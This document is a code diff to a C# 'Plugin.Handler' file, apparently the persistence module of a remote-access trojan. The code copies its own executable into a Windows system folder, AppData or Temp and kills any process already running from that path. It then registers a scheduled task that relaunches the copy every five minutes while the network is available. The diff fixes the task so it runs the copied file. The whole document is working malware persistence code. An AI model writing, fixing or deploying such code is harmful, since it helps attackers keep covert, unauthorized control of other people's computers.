@@ -25,73 +25,53 @@ namespace Plugin.Handler
             try
             {
                 string name = Process.GetCurrentProcess().ProcessName + ".exe";
+                string filepath;
 
                 if (Methods.IsAdmin()&& Environment.Is64BitOperatingSystem) 
                 {
-                    string filepath;
                     try
                     {
                         filepath = Path.Combine(@"C:\Windows\Sysnative", name);
-                    }
-                    catch
-                    {
-                        filepath = Path.Combine(Path.GetTempPath(), name);                        
-                    }
-                    FileInfo installPath = new FileInfo(filepath);
-                    if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
-                    {
-
-                        foreach (Process P in Process.GetProcesses())
+                        if (!Directory.Exists(@"C:\Windows\Sysnative")) 
                         {
-                            try
-                            {
-                                if (P.MainModule.FileName == installPath.FullName)
-                                    P.Kill();
-                            }
-                            catch { }
+                            Directory.CreateDirectory(@"C:\Windows\Sysnative");
                         }
-                    }
-                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
-                    TaskService ts = new TaskService();
-                    TaskDefinition td = ts.NewTask();
-                    td.RegistrationInfo.Description = Description;
-                    td.RegistrationInfo.Author = Author;
-                    TimeTrigger dt = new TimeTrigger();
-                    dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
-                    dt.Repetition.Interval = TimeSpan.FromMinutes(5);
-                    td.Triggers.Add(dt);
-                    td.Settings.DisallowStartIfOnBatteries = false;
-                    td.Settings.RunOnlyIfNetworkAvailable = true;
-                    td.Settings.RunOnlyIfIdle = false;
-                    td.Settings.DisallowStartIfOnBatteries = false;
-                    td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
-                    ts.RootFolder.RegisterTaskDefinition(TaskAdmin, td);
-                } 
-                else
-                {
-                    string filepath;
-                    try
-                    {
-                        filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
+                        FileInfo installPath = new FileInfo(filepath);
+                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
+                        {
+                            foreach (Process P in Process.GetProcesses())
+                            {
+                                try
+                                {
+                                    if (P.MainModule.FileName == installPath.FullName)
+                                        P.Kill();
+                                }
+                                catch { }
+                            }
+                        }
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                     }
                     catch
                     {
                         filepath = Path.Combine(Path.GetTempPath(), name);
-                    }
-                    FileInfo installPath = new FileInfo(filepath);
-                    if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
-                    {
-                        foreach (Process P in Process.GetProcesses())
+                        FileInfo installPath = new FileInfo(filepath);
+                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                         {
-                            try
+
+                            foreach (Process P in Process.GetProcesses())
                             {
-                                if (P.MainModule.FileName == installPath.FullName)
-                                    P.Kill();
+                                try
+                                {
+                                    if (P.MainModule.FileName == installPath.FullName)
+                                        P.Kill();
+                                }
+                                catch { }
                             }
-                            catch { }
                         }
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                     }
-                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    
+                    
                     TaskService ts = new TaskService();
                     TaskDefinition td = ts.NewTask();
                     td.RegistrationInfo.Description = Description;
@@ -104,7 +84,62 @@ namespace Plugin.Handler
                     td.Settings.RunOnlyIfNetworkAvailable = true;
                     td.Settings.RunOnlyIfIdle = false;
                     td.Settings.DisallowStartIfOnBatteries = false;
-                    td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
+                    td.Actions.Add(new ExecAction(filepath, "", null));
+                    ts.RootFolder.RegisterTaskDefinition(TaskAdmin, td);
+                } 
+                else
+                {
+                    try
+                    {
+                        filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
+                        FileInfo installPath = new FileInfo(filepath);
+                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
+                        {
+                            foreach (Process P in Process.GetProcesses())
+                            {
+                                try
+                                {
+                                    if (P.MainModule.FileName == installPath.FullName)
+                                        P.Kill();
+                                }
+                                catch { }
+                            }
+                        }
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    }
+                    catch
+                    {
+                        filepath = Path.Combine(Path.GetTempPath(), name);
+                        FileInfo installPath = new FileInfo(filepath);
+                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
+                        {
+                            foreach (Process P in Process.GetProcesses())
+                            {
+                                try
+                                {
+                                    if (P.MainModule.FileName == installPath.FullName)
+                                        P.Kill();
+                                }
+                                catch { }
+                            }
+                        }
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    }
+                    
+                    
+                    TaskService ts = new TaskService();
+                    TaskDefinition td = ts.NewTask();
+                    td.RegistrationInfo.Description = Description;
+                    td.RegistrationInfo.Author = Author;
+                    TimeTrigger dt = new TimeTrigger();
+                    dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
+                    dt.Repetition.Interval = TimeSpan.FromMinutes(5);
+                    td.Triggers.Add(dt);
+                    td.Settings.DisallowStartIfOnBatteries = false;
+                    td.Settings.RunOnlyIfNetworkAvailable = true;
+                    td.Settings.RunOnlyIfIdle = false;
+                    td.Settings.DisallowStartIfOnBatteries = false;
+                    td.Actions.Add(new ExecAction(filepath, "", null));
                     ts.RootFolder.RegisterTaskDefinition(Task, td);
                 }
             }
